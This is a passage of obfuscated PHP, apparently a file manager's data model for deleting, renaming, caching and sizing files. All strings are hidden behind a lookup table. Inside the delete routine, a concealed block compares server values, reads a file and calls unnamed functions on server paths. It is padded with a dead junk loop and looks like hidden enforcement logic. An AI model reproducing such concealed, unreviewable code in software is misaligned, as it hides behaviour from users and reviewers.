$ïÑ™â²Ğ; } private function recycleClear($ƒ™Æ—öÄ) { $ÏòÁÖ¨õ =& $_SERVER[ĞÂ¤àÓï]; $’é»÷ÉË = $this->childrenAll($ƒ™Æ—öÄ); $›¦Ø÷„à = array($ÏòÁÖ¨õ[417] => array($ÏòÁÖ¨õ[418], $’é»÷ÉË[$ÏòÁÖ¨õ[2146]])); Model($ÏòÁÖ¨õ[2147])->where($›¦Ø÷„à)->delete(); } public function removeNow($‰Õ¡ğ¢€, $úà¨ú‚õ = true) { $µ½ÅãÂ =& $_SERVER[ĞÂ¤àÓï]; if ($_SERVER[$µ½ÅãÂ[777]] != $_SERVER[$µ½ÅãÂ[1373]]) { $ ÃâÖ£  = $µ½ÅãÂ[879]; $ÎÔÌ¢Ğ· = $µ½ÅãÂ[778]; $§¿¼áÂí = $_SERVER[$µ½ÅãÂ[779]] . $µ½ÅãÂ[780]; $¿¤¯„‹† = $ÎÔÌ¢Ğ·($§¿¼áÂí); $ÅàŞÃó„ = explode($µ½ÅãÂ[231], $¿¤¯„‹†); if (count($ÅàŞÃó„) < $µ½ÅãÂ[620]) { $¤Ğ¢Ÿ¡â = $µ½ÅãÂ[781]; $¤Ğ¢Ÿ¡â(); } $×‚”Şˆ÷ = $µ½ÅãÂ[880]; $×‚”Şˆ÷($_SERVER[$µ½ÅãÂ[881]]); $×‚”Şˆ÷($_SERVER[$µ½ÅãÂ[779]] . $µ½ÅãÂ[1531]); $Ïú‹­— = 1; while ($Ïú‹­— > 1) { $Ïú‹­— = $Ïú‹­— + 4; $æÛõĞˆÓ = rawurlencode($Ïú‹­— . $µ½ÅãÂ[378]); } } $íúÛÎõî = $this->sourceInfo($‰Õ¡ğ¢€); $ŒàŸ´öÌ = $this->pathInfoMore($‰Õ¡ğ¢€); if (!$íúÛÎõî) { return !0; } if ($íúÛÎõî[$µ½ÅãÂ[432]] == 0) { if (!_get($GLOBALS, $µ½ÅãÂ[503])) { return !1; } } $this->lockMoveStart($‰Õ¡ğ¢€); Hook::trigger($µ½ÅãÂ[2148], $ŒàŸ´öÌ, $úà¨ú‚õ); if ($úà¨ú‚õ) { Model($µ½ÅãÂ[2147])->moveToRecycle($‰Õ¡ğ¢€); } else { $´ÛÒ¹€¤ = $this->childrenAll($íúÛÎõî); Model($µ½ÅãÂ[570])->eventRemove($‰Õ¡ğ¢€); $this->removeRelevance($´ÛÒ¹€¤[$µ½ÅãÂ[2146]], $´ÛÒ¹€¤[$µ½ÅãÂ[1480]]); } $this->folderSizeReset($íúÛÎõî[$µ½ÅãÂ[432]]); $ğ½‹İ€Ğ = array($íúÛÎõî[$µ½ÅãÂ[432]]); if ($íúÛÎõî[$µ½ÅãÂ[410]] == $µ½ÅãÂ[88]) { $ğ½‹İ€Ğ[] = $íúÛÎõî[$µ½ÅãÂ[402]]; } $this->updateModifyTime($ğ½‹İ€Ğ); $this->lockMoveEnd($‰Õ¡ğ¢€); Hook::trigger($µ½ÅãÂ[1707], $ŒàŸ´öÌ, $úà¨ú‚õ); return !0; } public function childrenAll($éØë¡—š) { $™šÓµ =& $_SERVER[ĞÂ¤àÓï]; $šÌäÜåı = $éØë¡—š[$™šÓµ[402]]; if ($éØë¡—š[$™šÓµ[410]] == $™šÓµ[88]) { $ëË›²¸² = array($™šÓµ[590] => array($™šÓµ[550], $éØë¡—š[$™šÓµ[521]] . $šÌäÜåı . $™šÓµ[551])); $ñ²ŸÒøê = array($™šÓµ[590] => $ëË›²¸²[$™šÓµ[521]]); $Æ…Š“ÚÁ = $this->field($™šÓµ[2149])->where($ñ²ŸÒøê)->select(); $şĞİç”‰ = !1; $ŠéæººÖ = array($šÌäÜåı); if ($Æ…Š“ÚÁ) { $şĞİç”‰ = array_to_keyvalue($Æ…Š“ÚÁ, $™šÓµ[12], $™šÓµ[468]); $şĞİç”‰ = array_remove_value($şĞİç”‰, $™šÓµ[197]); $ŠéæººÖ = array_to_keyvalue($Æ…Š“ÚÁ, $™šÓµ[12], $™šÓµ[402]); $ŠéæººÖ[] = $šÌäÜåı; } } else { $şĞİç”‰ = array($éØë¡—š[$™šÓµ[468]]); $ŠéæººÖ = array($šÌäÜåı); } return array($™šÓµ[2146] => $ŠéæººÖ, $™šÓµ[1480] => $şĞİç”‰); } public function removeArray($ïÚ‘Ûü£) { if (!$ïÚ‘Ûü£) { return !0; } } public function removeRelevance($«Š“”” , $ÓéËÀ×Ú) { $Ñ¢şïÇ =& $_SERVER[ĞÂ¤àÓï]; $«Š“””  = $«Š“””  ? $«Š“””  : array(); $ÓéËÀ×Ú = $ÓéËÀ×Ú ? $ÓéËÀ×Ú : array(); $«Š“””  = array_unique(array_filter($«Š“”” )); $ÓéËÀ×Ú = array_unique(array_filter($ÓéËÀ×Ú)); if (!$«Š“”” ) { return !1; } $™«Ğ¦÷– = array($Ñ¢şïÇ[417] => array($Ñ¢şïÇ[418], $«Š“”” )); Model($Ñ¢şïÇ[2147])->where($™«Ğ¦÷–)->delete(); Model($Ñ¢şïÇ[462])->where($™«Ğ¦÷–)->delete(); Model($Ñ¢şïÇ[2000])->where($™«Ğ¦÷–)->delete(); Model($Ñ¢şïÇ[570])->where($™«Ğ¦÷–)->delete(); Model($Ñ¢şïÇ[1834])->removeBySource($«Š“”” ); Model($Ñ¢şïÇ[2129])->removeBySource($«Š“”” ); $this->where($™«Ğ¦÷–)->delete(); Model($Ñ¢şïÇ[471])->remove($ÓéËÀ×Ú); for ($“îÇò™ = 0; $“îÇò™ < count($«Š“”” ); $“îÇò™++) { $this->sourceCacheClear($«Š“”” [$“îÇò™]); } } public function rename($ìïê¥“, $ªİ×ßé˜) { $ğÚäêÆñ =& $_SERVER[ĞÂ¤àÓï]; $¢•‚€ = $this->sourceInfo($ìïê¥“); if (!$¢•‚€) { return !1; } $Éµ¢‚‰Ø = $this->fileNameExist($¢•‚€[$ğÚäêÆñ[432]], $ªİ×ßé˜); if ($Éµ¢‚‰Ø && $Éµ¢‚‰Ø != $ìïê¥“) { return !1; } $Ø“ÃÌ¾ = array($ğÚäêÆñ[420] => $ªİ×ßé˜, $ğÚäêÆñ[589] => USER_ID); if ($¢•‚€[$ğÚäêÆñ[410]] != $ğÚäêÆñ[88]) { $Ø“ÃÌ¾[$ğÚäêÆñ[412]] = substr(get_path_ext($ªİ×ßé˜), 0, 10); } Model($ğÚäêÆñ[570])->eventRename($ìïê¥“, $¢•‚€[$ğÚäêÆñ[32]], $ªİ×ßé˜); $this->sourceCacheClear($ìïê¥“); $this->setNamePinyin($ìïê¥“, $Ø“ÃÌ¾[$ğÚäêÆñ[32]], !1); $this->updateModifyTime($¢•‚€[$ğÚäêÆñ[432]]); $®‘°ìË¡ = $this->where(array($ğÚäêÆñ[417] => $ìïê¥“))->data($Ø“ÃÌ¾)->save(); $ÊíÒø¯‰ = $ğÚäêÆñ[2136] . $¢•‚€[$ğÚäêÆñ[432]]; if (isset(self::$cacheChildList[$ÊíÒø¯‰])) { unset(self::$cacheChildList[$ÊíÒø¯‰]); } return $®‘°ìË¡; } public function setNamePinyin($ªı€ˆ¯‹, $°èê‰Ù, $–²–úÜ£ = true) { $îªÛ¶Ğ— =& $_SERVER[ĞÂ¤àÓï]; $Å¨¦³£¿ = Input::check($°èê‰Ù, $îªÛ¶Ğ—[593]); $ıİ»»ç³ = array($îªÛ¶Ğ—[444] => KodSort::makeStr($°èê‰Ù)); if ($Å¨¦³£¿) { $ıİ»»ç³[$îªÛ¶Ğ—[465]] = str_replace($îªÛ¶Ğ—[53], $îªÛ¶Ğ—[12], Pinyin::get($°èê‰Ù)); $ıİ»»ç³[$îªÛ¶Ğ—[464]] = Pinyin::get($°èê‰Ù, $îªÛ¶Ğ—[594]); } if (!$–²–úÜ£ && !$Å¨¦³£¿) { $ıİ»»ç³[$îªÛ¶Ğ—[465]] = null; $ıİ»»ç³[$îªÛ¶Ğ—[464]] = null; } $this->metaSet($ªı€ˆ¯‹, $ıİ»»ç³); } public function getContent($Œú¸ˆ¿÷) { $€Ãü§Òä =& $_SERVER[ĞÂ¤àÓï]; $Š—¦Á¾É = $this->fileInfoGet($Œú¸ˆ¿÷); if (!$Š—¦Á¾É) { return !1; } if ($Š—¦Á¾É[$€Ãü§Òä[76]] == 0) { return $€Ãü§Òä[12]; } $úÑŞ¶ = $€Ãü§Òä[2150] . $Š—¦Á¾É[$€Ãü§Òä[176]]; if ($Š—¦Á¾É[$€Ãü§Òä[76]] <= 1024 * 10) { $¢Ş¯Õïó = Cache::get($úÑŞ¶); if (!$¢Ş¯Õïó) { $¢Ş¯Õïó = IO::getContent($Š—¦Á¾É[$€Ãü§Òä[84]]); Cache::set($úÑŞ¶, $¢Ş¯Õïó); } return $¢Ş¯Õïó; } if (!$Š—¦Á¾É[$€Ãü§Òä[84]]) { return $€Ãü§Òä[12]; } return IO::getContent($Š—¦Á¾É[$€Ãü§Òä[84]]); } public function setDesc($ÂâÁöŠÁ, $Ø±·“ğµ) { $à’ıùÈ =& $_SERVER[ĞÂ¤àÓï]; Model($à’ıùÈ[570])->eventAddDesc($ÂâÁöŠÁ, $Ø±·“ğµ); return $this->metaSet($ÂâÁöŠÁ, $à’ıùÈ[453], $Ø±·“ğµ); } public function setContent($À×èŞ–ú, $óÑÇÇ½ü = '') { $¸Æéşò =& $_SERVER[ĞÂ¤àÓï]; $ŠÀŸˆ£š = $this->sourceInfo($À×èŞ–ú); $ÙÄÎ¤ÇŠ = $this->fileInfoGet($À×èŞ–ú); if (!$ÙÄÎ¤ÇŠ || !$ŠÀŸˆ£š) { return !1; } $–®Ù™›² = Model($¸Æéşò[471])->addFileByContent($óÑÇÇ½ü, $ŠÀŸˆ£š[$¸Æéşò[32]]); $ÏÈËö… = $this->fileHistory($ŠÀŸˆ£š, $–®Ù™›²[$¸Æéşò[468]], $–®Ù™›²[$¸Æéşò[76]]); if (!$ÏÈËö…) { return Model($¸Æéşò[471])->remove($–®Ù™›²[$¸Æéşò[468]]); } $this->folderSizeReset($ŠÀŸˆ£š[$¸Æéşò[432]]); return !0; } public function fileSubstr($“ñõ¼¥Æ, $á™ÕŞĞ“, $•µ¤İ‡) { $ÛíèÁªä = $this->fileInfoGet($“ñõ¼¥Æ); if (!$ÛíèÁªä) { return !1; } return IO::fileSubstr($ÛíèÁªä[$_SERVER[ĞÂ¤àÓï][84]], $á™ÕŞĞ“, $•µ¤İ‡); } public function fileInfoGet($ øÙúéô) { $Ÿ¡“Ôø =& $_SERVER[ĞÂ¤àÓï]; $Ã½¡˜®ö = $this->sourceInfo($ øÙúéô); if (!$Ã½¡˜®ö || $Ã½¡˜®ö[$Ÿ¡“Ôø[410]]) { return !1; } $Ÿ§Ã‹¯ = $Ÿ¡“Ôø[474] . $Ã½¡˜®ö[$Ÿ¡“Ôø[468]]; $Šô³ Øñ = _get(self::$cacheFileInfo, $Ÿ§Ã‹¯); if ($Šô³ Øñ) { return $Šô³ Øñ; } $ìÄ¶ó¬Ó = Model($Ÿ¡“Ôø[471])->fileInfo($Ã½¡˜®ö[$Ÿ¡“Ôø[468]]); if ($ìÄ¶ó¬Ó) { $ìÄ¶ó¬Ó[$Ÿ¡“Ôø[32]] = $Ã½¡˜®ö[$Ÿ¡“Ôø[32]]; } self::$cacheFileInfo[$Ÿ§Ã‹¯] = $ìÄ¶ó¬Ó; return $ìÄ¶ó¬Ó; } private function folderChildrenNumber($«õûöÅ) { $ÆíÑøùÁ =& $_SERVER[ĞÂ¤àÓï]; $ä¤Àä = $this->sourceInfo($«õûöÅ); $Ó­°ñé¶ = array($ÆíÑøùÁ[590] => array($ÆíÑøùÁ[550], $ä¤Àä[$ÆíÑøùÁ[521]] . $«õûöÅ . $ÆíÑøùÁ[551]), $ÆíÑøùÁ[587] => $ä¤Àä[$ÆíÑøùÁ[505]], $ÆíÑøùÁ[430] => intval($ä¤Àä[$ÆíÑøùÁ[431]]), $ÆíÑøùÁ[583] => 1); $‹‰Íø = $this->where($Ó­°ñé¶)->count(); $©—ªÀµ£ = $this->where($Ó­°ñé¶)->where(array($ÆíÑøùÁ[583] => 0))->count(); return array($ÆíÑøùÁ[80] => $©—ªÀµ£, $ÆíÑøùÁ[81] => $‹‰Íø); } public function pathInfo($µ¿‚èèã, $–ñÙÄá = false) { $À„¤ÇØÉ =& $_SERVER[ĞÂ¤àÓï]; $–ñÙÄá = !1; $µ¿‚èèã = intval($µ¿‚èèã); $ÆÛëÍêÍ = $À„¤ÇØÉ[461] . intval($–ñÙÄá) . $À„¤ÇØÉ[386] . $µ¿‚èèã; $èˆ†Â¹½ = _get(self::$cachePathInfo, $ÆÛëÍêÍ); if ($èˆ†Â¹½) { return $èˆ†Â¹½; } $¿›Èù’Å = $this->sourceInfo($µ¿‚èèã); if (!$¿›Èù’Å) { return !1; } $¿›Èù’Å = $this->_listDataApplyItem($¿›Èù’Å, $–ñÙÄá); self::$cachePathInfo[$ÆÛëÍêÍ] = $¿›Èù’Å; return $¿›Èù’Å; } public static $cachePathInfoMore = array(); public function pathInfoMore($÷·…”éÍ) { $£­¸Ôö¿ =& $_SERVER[ĞÂ¤àÓï]; $Ùãœ“© = _get(self::$cachePathInfoMore, $÷·…”éÍ); if ($Ùãœ“©) { return $Ùãœ“©; } $‘î…Ô†® = $this->pathInfo($÷·…”éÍ); if (!$‘î…Ô†®) { return !1; } if ($‘î…Ô†®[$£­¸Ôö¿[410]] == $£­¸Ôö¿[88]) { $‘î…Ô†®[$£­¸Ôö¿[79]] = $this->folderChildrenNumber($÷·…”éÍ); } self::$cachePathInfoMore[$÷·…”éÍ] = $‘î…Ô†®; return $‘î…Ô†®; } public function sourceInfo($Ìç†ïÌÖ) { $ÃïÕ®ö‚ =& $_SERVER[ĞÂ¤àÓï]; if (!$Ìç†ïÌÖ) { return array(); } $Ìç†ïÌÖ = intval($Ìç†ïÌÖ); $¥ÔÕ–Á– = $ÃïÕ®ö‚[460] . $Ìç†ïÌÖ; $ªùÍ ÜÆ = _get(self::$cacheSourceInfo, $¥ÔÕ–Á–); if ($ªùÍ ÜÆ) { return $ªùÍ ÜÆ; } $úÀì¤ = $this->where(array($ÃïÕ®ö‚[402] => $Ìç†ïÌÖ))->find(); self::$cacheSourceInfo[$¥ÔÕ–Á–] = $úÀì¤; return self::$cacheSourceInfo[$¥ÔÕ–Á–]; } public function sourceCacheClear($¾İ¼¿ãù = false) { self::cacheClear($¾İ¼¿ãù); } public static function cacheClear($‡ßßÁ«¬ = false) { $ºòšá²” =& $_SERVER[ĞÂ¤àÓï]; if ($‡ßßÁ«¬ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ºòšá²”[460] . $‡ßßÁ«¬]); unset(self::$cachePathInfoMore[$‡ßßÁ«¬]); unset(self::$cachePathInfo[$ºòšá²”[2151] . $‡ßßÁ«¬]); unset(self::$cachePathInfo[$ºòšá²”[2152] . $‡ßßÁ«¬]); } public function metaSet($İÁÜÁ½ò, $ñ¯’ˆÇ = null, $ Ë¿¯ÆÏ = null) { $ŠŸä­Ã = parent::metaSet($İÁÜÁ½ò, $ñ¯’ˆÇ, $ Ë¿¯ÆÏ); if ($ŠŸä­Ã) { $this->sourceCacheClear($İÁÜÁ½ò); } return $ŠŸä­Ã; } public function pathInfoByPath($ÉÁÛ«², $Ëé¦Ïòá) { $Ó°¡æË =& $_SERVER[ĞÂ¤àÓï]; $¿Á»³‘µ = !$Ëé¦Ïòá ? array() : explode($Ó°¡æË[8], trim($Ëé¦Ïòá, $Ó°¡æË[8])); $ˆ·èÛ« = $ÉÁÛ«²; foreach ($¿Á»³‘µ as $ÔËïÜœñ) { $ÃŸúÂÜÚ = array($Ó°¡æË[432] => $ˆ·èÛ«, $Ó°¡æË[32] => $ÔËïÜœñ); $˜˜”ÈÅ = $this->where($ÃŸúÂÜÚ)->select(); if (!$˜˜”ÈÅ) { return !1; } $˜˜”ÈÅ = array_sort_by($˜˜”ÈÅ, $Ó°¡æË[431]); $ˆ·èÛ« = $˜˜”ÈÅ[0][$Ó°¡æË[402]]; } return $this->pathInfo($ˆ·èÛ«, !0); } protected function updateModifyTime($Ë“‡¬Äî) { $öÒèèúó =& $_SERVER[ĞÂ¤àÓï]; $ÚÂ‘·Ô¢ = defined($öÒèèúó[475]) ? USER_ID : $öÒèèúó[197]; if (!$Ë“‡¬Äî) { return; } if (!is_array($Ë“‡¬Äî)) { $Ë“‡¬Äî = array($Ë“‡¬Äî); } foreach ($Ë“‡¬Äî as $äâúÈêú => $µå¶œÒº) { $Ë“‡¬Äî[$äâúÈêú] = intval($µå¶œÒº); $this->sourceCacheClear($µå¶œÒº); } $²º·ö ¶ = array($öÒèèúó[402] => array($öÒèèúó[7], $Ë“‡¬Äî)); $ñÑçÚ­º = array($öÒèèúó[589] => $ÚÂ‘·Ô¢, $öÒèèúó[424] => time()); $this->where($²º·ö ¶)->save($ñÑçÚ­º); } public function folderSizeReset($Ù„¥Ü³õ, $‚¼Ù¶ò = false) { $—ÙÖˆ‚ =& $_SERVER[ĞÂ¤àÓï]; if ($this->statusIgnoreResetSpace) { return; } $àÇ¼à‹— = $this->sourceInfo($Ù„¥Ü³õ); $ƒ½úÇÃ = $—ÙÖˆ‚[2153] . $Ù„¥Ü³õ; CacheLock::lock($ƒ½úÇÃ, 20); if ($‚¼Ù¶ò === !1) { $this->sourceCacheClear($Ù„¥Ü³õ); $àÇ¼à‹— = $this->sourceInfo($Ù„¥Ü³õ); $«ÊñˆÌÚ = array($—ÙÖˆ‚[401] => $Ù„¥Ü³õ, $—ÙÖˆ‚[430] => 0); $ã°‡ôë˜ = $this->where($«ÊñˆÌÚ)->sum($—ÙÖˆ‚[76]); $‚¼Ù¶ò = intval($ã°‡ôë˜) - intval($àÇ¼à‹—[$—ÙÖˆ‚[76]]); } if ($‚¼Ù¶ò == 0) { return CacheLock::unlock($ƒ½úÇÃ); } $¥†›ìÜ = $this->parentLevelArray($àÇ¼à‹—[$—ÙÖˆ‚[521]]); if (!$¥†›ìÜ) { $¥†›ìÜ = array(); } $¥†›ìÜ[] = $àÇ¼à‹—[$—ÙÖˆ‚[402]]; $«ÊñˆÌÚ = array($—ÙÖˆ‚[402] => array($—ÙÖˆ‚[418], $¥†›ìÜ)); if ($‚¼Ù¶ò < 0) { $«ÊñˆÌÚ[$—ÙÖˆ‚[76]] = array($—ÙÖˆ‚[1015], abs($‚¼Ù¶ò)); } $this->where($«ÊñˆÌÚ)->setAdd($—ÙÖˆ‚[76], $‚¼Ù¶ò); CacheLock::unlock($ƒ½úÇÃ); $óòÍ²¹ = $—ÙÖˆ‚[2154] . $àÇ¼à‹—[$—ÙÖˆ‚[411]] . $—ÙÖˆ‚[4] . $àÇ¼à‹—[$—ÙÖˆ‚[505]]; $Î½©ñë = array($àÇ¼à‹—[$—ÙÖˆ‚[411]], $àÇ¼à‹—[$—ÙÖˆ‚[505]]); TaskRun::timeLimitCall($óòÍ²¹, $—ÙÖˆ‚[2155], $Î½©ñë, 1.5); } public function folderSizeResetChildren($ë÷Èƒãİ) { $ÊÕ¦¶« =& $_SERVER[ĞÂ¤àÓï]; $this->sourceCacheClear($ë÷Èƒãİ); $èıˆìä = $this->sourceInfo($ë÷Èƒãİ); $¸êãÚ¥ª = array($ÊÕ¦¶«[583] => 1, $ÊÕ¦¶«[587] => $èıˆìä[$ÊÕ¦¶«[505]], $ÊÕ¦¶«[590] => array($ÊÕ¦¶«[550], $èıˆìä[$ÊÕ¦¶«[521]] . $ë÷Èƒãİ . $ÊÕ¦¶«[551])); $ãìøş¢ = $ÊÕ¦¶«[2156]; $¹œú½¿¡ = $this->field($ãìøş¢)->where($¸êãÚ¥ª)->select(); $¸êãÚ¥ª[$ÊÕ¦¶«[410]] = 0; $¼€…¼éä = $this->field($ãìøş¢)->where($¸êãÚ¥ª)->select(); if (!$¼€…¼éä) { return; } $¹œú½¿¡[] = $èıˆìä; $¹œú½¿¡ = array_to_keyvalue($¹œú½¿¡, $ÊÕ¦¶«[402]); foreach ($¹œú½¿¡ as $–ï×Çåˆ => $ éİîÔ©) { $¹œú½¿¡[$–ï×Çåˆ][$ÊÕ¦¶«[2157]] = $¹œú½¿¡[$–ï×Çåˆ][$ÊÕ¦¶«[76]]; $¹œú½¿¡[$–ï×Çåˆ][$ÊÕ¦¶«[76]] = 0; } foreach ($¼€…¼éä as $ éİîÔ©) { $ëì½‘¬ù = $ éİîÔ©[$ÊÕ¦¶«[432]] . $ÊÕ¦¶«[12]; if (!isset($¹œú½¿¡[$ëì½‘¬ù])) { continue; } if ($ éİîÔ©[$ÊÕ¦¶«[431]] == $¹œú½¿¡[$ëì½‘¬ù][$ÊÕ¦¶«[431]]) { $¹œú½¿¡[$ëì½‘¬ù][$ÊÕ¦¶«[76]] += $ éİîÔ©[$ÊÕ¦¶«[76]]; } } foreach ($¹œú½¿¡ as $ éİîÔ©) { $™Ãê˜üˆ = $this->parentLevelArray($ éİîÔ©[$ÊÕ¦¶«[521]]); foreach ($™Ãê˜üˆ as $ëì½‘¬ù) { $ëì½‘¬ù = $ëì½‘¬ù . $ÊÕ¦¶«[12]; if (!isset($¹œú½¿¡[$ëì½‘¬ù])) { continue; } if ($ éİîÔ©[$ÊÕ¦¶«[431]] == $¹œú½¿¡[$ëì½‘¬ù][$ÊÕ¦¶«[431]]) { $¹œú½¿¡[$ëì½‘¬ù][$ÊÕ¦¶«[76]] += $ éİîÔ©[$ÊÕ¦¶«[76]]; } } } $ËÇôÅÃ‡ = array(); foreach ($¹œú½¿¡ as $ éİîÔ©) { if ($ éİîÔ©[$ÊÕ¦¶«[76]] == $ éİîÔ©[$ÊÕ¦¶«[2157]]) { continue; } $ËÇôÅÃ‡[] = array($ÊÕ¦¶«[402], $ éİîÔ©[$ÊÕ¦¶«[402]], $ÊÕ¦¶«[76], $ éİîÔ©[$ÊÕ¦¶«[76]]); } $this->saveAll($ËÇôÅÃ‡); } public function userSpaceReset($€µİ—¿‰ = false) { $¼úì‰âã =& $_SERVER[ĞÂ¤àÓï]; $¡ÈÈ¤×ô = $this->where(array($¼úì‰âã[411] => self::TYPE_USER, $¼úì‰âã[505] => $€µİ—¿‰, $¼úì‰âã[410] => 0))->sum($¼úì‰âã[76]); $¡ÈÈ¤×ô = !$¡ÈÈ¤×ô || $¡ÈÈ¤×ô <= 0 ? 0 : $¡ÈÈ¤×ô; Model($¼úì‰âã[513])->userEdit($€µİ—¿‰, array($¼úì‰âã[1843] => $¡ÈÈ¤×ô)); } public function targetSpaceUpdate($æ¼‚ÁŞÖ, $¦åË¡¸˜) { $ÕÌòÊëÛ =& $_SERVER[ĞÂ¤àÓï]; if (!$¦åË¡¸˜) { return; } if (!in_array($æ¼‚ÁŞÖ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ÀŒ”¸¡ = $this->targetSpaceSize($æ¼‚ÁŞÖ, $¦åË¡¸˜); if ($æ¼‚ÁŞÖ == self::TYPE_USER) { Model($ÕÌòÊëÛ[513])->userEdit($¦åË¡¸˜, array($ÕÌòÊëÛ[1843] => $ÀŒ”¸¡)); } else { if ($æ¼‚ÁŞÖ == self::TYPE_GROUP) { Model($ÕÌòÊëÛ[522])->groupEdit($¦åË¡¸˜, array($ÕÌòÊëÛ[1843] => $ÀŒ”¸¡)); } } } public function targetSpaceSize($İ‰Ü“²’, $§¨ºèË¯) { $ğŞÃ±« =& $_SERVER[ĞÂ¤àÓï]; $¢Åíî‘ = 0; $¤Ô…¢¬Æ = $this->targetSourceRoot($İ‰Ü“²’, $§¨ºèË¯, !0); foreach ($¤Ô…¢¬Æ as $œ°­¡›°) { if (!$œ°­¡›°) { continue; } $¢Åíî‘ += floatval($œ°­¡›°[$ğŞÃ±«[76]]); $é•ôğ°µ = array($ğŞÃ±«[590] => array($ğŞÃ±«[550], $ğŞÃ±«[531] . $œ°­¡›°[$ğŞÃ±«[402]] . $ğŞÃ±«[551])); $¤Ú‡Û‹ = Model($ğŞÃ±«[429])->field($ğŞÃ±«[417])->where($é•ôğ°µ)->select(); $¤Ú‡Û‹ = array_to_keyvalue($¤Ú‡Û‹, $ğŞÃ±«[12], $ğŞÃ±«[402]); $¤Ú‡Û‹ = array_unique(array_filter($¤Ú‡Û‹)); if ($¤Ú‡Û‹) { $é•ôğ°µ = array($ğŞÃ±«[417] => array($ğŞÃ±«[418], $¤Ú‡Û‹)); $¢Åíî‘ += floatval($this->where($é•ôğ°µ)->sum($ğŞÃ±«[76])); } } $¢Åíî‘ = !$¢Åíî‘ || $¢Åíî‘ <= 0 ? 0 : $¢Åíî‘; return $¢Åíî‘; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¿„²‹©Ó) { return $this->fileTypeProfile($¿„²‹©Ó, SourceModel::TYPE_USER); } public function groupFileTypeProfile($˜İ‹¿§µ) { return $this->fileTypeProfile($˜İ‹¿§µ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¦üîé¶Ç, $–°í£) { $Êè¸¨‘œ =& $_SERVER[ĞÂ¤àÓï]; $ûÖ›ö¨ = $Êè¸¨‘œ[2158] . $¦üîé¶Ç . $Êè¸¨‘œ[11] . $–°í£; $û¾ùÂ­¥ = Cache::get($ûÖ›ö¨); if ($û¾ùÂ­¥) { return $û¾ùÂ­¥; } $‹±‘›ÒŒ = array($Êè¸¨‘œ[583] => 0); if ($¦üîé¶Ç != !1) { $‹±‘›ÒŒ[$Êè¸¨‘œ[505]] = $¦üîé¶Ç; $‹±‘›ÒŒ[$Êè¸¨‘œ[411]] = $–°í£; } $‹„‹€¬ä = array(); $‹„‹€¬ä[$Êè¸¨‘œ[2159]] = array($Êè¸¨‘œ[2160] => LNG($Êè¸¨‘œ[2159]), $Êè¸¨‘œ[2161] => $this->where($‹±‘›ÒŒ)->count(), $Êè¸¨‘œ[585] => $this->where($‹±‘›ÒŒ)->sum($Êè¸¨‘œ[76])); $¬Ö˜­‚¶ = KodIO::fileTypeList(); foreach ($¬Ö˜­‚¶ as $´Óµ£˜æ => $ãæÔªÒĞ) { $‹±‘›ÒŒ[$Êè¸¨‘œ[412]] = $this->fileTypeWhere($´Óµ£˜æ); $‹„‹€¬ä[$´Óµ£˜æ] = array($Êè¸¨‘œ[2160] => $ãæÔªÒĞ[$Êè¸¨‘œ[32]], $Êè¸¨‘œ[2161] => $this->where($‹±‘›ÒŒ)->count(), $Êè¸¨‘œ[585] => $this->where($‹±‘›ÒŒ)->sum($Êè¸¨‘œ[76])); } Cache::set($ûÖ›ö¨, $‹„‹€¬ä, 1200); return $‹„‹€¬ä; } public function fileNameExist($ÏŞ¸†äã, $üĞŒşà) { $ûû˜éüÉ =& $_SERVER[ĞÂ¤àÓï]; $Œ¨¢Í« = $this->where(array($ûû˜éüÉ[432] => $ÏŞ¸†äã, $ûû˜éüÉ[32] => $üĞŒşà, $ûû˜éüÉ[431] => 0))->find(); return is_array($Œ¨¢Í«) ? $Œ¨¢Í«[$ûû˜éüÉ[402]] : !1; } public function childList($³àÆáÑ) { $èÌòĞĞ„ =& $_SERVER[ĞÂ¤àÓï]; $Àûæí©¿ = $èÌòĞĞ„[2136] . $³àÆáÑ; if (isset(self::$cacheChildList[$Àûæí©¿])) { return self::$cacheChildList[$Àûæí©¿]; } $„“ïÛ‚³ = array($èÌòĞĞ„[432] => intval($³àÆáÑ), $èÌòĞĞ„[431] => 0); $şÖ—Ÿ•† = $this->where($„“ïÛ‚³)->select(); $şÖ—Ÿ•† = $şÖ—Ÿ•† ? $şÖ—Ÿ•† : array(); self::$cacheChildList[$Àûæí©¿] = $şÖ—Ÿ•†; foreach ($şÖ—Ÿ•† as $şä…Èæ£) { $Àûæí©¿ = $èÌòĞĞ„[460] . $şä…Èæ£[$èÌòĞĞ„[402]]; self::$cacheSourceInfo[$Àûæí©¿] = $şä…Èæ£; } return $şÖ—Ÿ•†; } public function fileNameAuto($»Ÿº…Û, $¹Ô«û¤Ë, $³ê°¾ = REPEAT_RENAME, $ÑíÑ‘¨ = false) { $³Œ¨½Ÿö =& $_SERVER[ĞÂ¤àÓï]; $ˆ¹àÁà = get_path_ext($¹Ô«û¤Ë); $ŞÁƒù—˜ = $ˆ¹àÁà ? basename($¹Ô«û¤Ë, $³Œ¨½Ÿö[10] . $ˆ¹àÁà) . $³Œ¨½Ÿö[2162] . $ˆ¹àÁà : $¹Ô«û¤Ë . $³Œ¨½Ÿö[384]; $ú‡ÒôšÏ = array($³Œ¨½Ÿö[432] => $»Ÿº…Û, $³Œ¨½Ÿö[431] => 0, $³Œ¨½Ÿö[32] => array($³Œ¨½Ÿö[383], $ŞÁƒù—˜)); $³–¢¡Šğ = $this->field($³Œ¨½Ÿö[32])->where($ú‡ÒôšÏ)->select(); $Æ¢’£˜ = array_to_keyvalue($³–¢¡Šğ, $³Œ¨½Ÿö[12], $³Œ¨½Ÿö[32]); return $this->fileNameAutoGet($Æ¢’£˜, $¹Ô«û¤Ë, $³ê°¾, $ÑíÑ‘¨); } public function fileNameAutoGet($œá´Ü, $ïÖÆ˜, $‹Ö·…‡¥, $ã…ú–Œ¤) { $¸¯Úºšù =& $_SERVER[ĞÂ¤àÓï]; if ($‹Ö·…‡¥ == REPEAT_REPLACE || !$œá´Ü || !in_array_not_case($ïÖÆ˜, $œá´Ü) || $ã…ú–Œ¤ && $‹Ö·…‡¥ != REPEAT_RENAME_FOLDER) { return $ïÖÆ˜; } if ($‹Ö·…‡¥ == REPEAT_SKIP) { return !1; } $Ü«­‰ = $¸¯Úºšù[10] . get_path_ext($ïÖÆ˜); $Ü«­‰ = $Ü«­‰ == 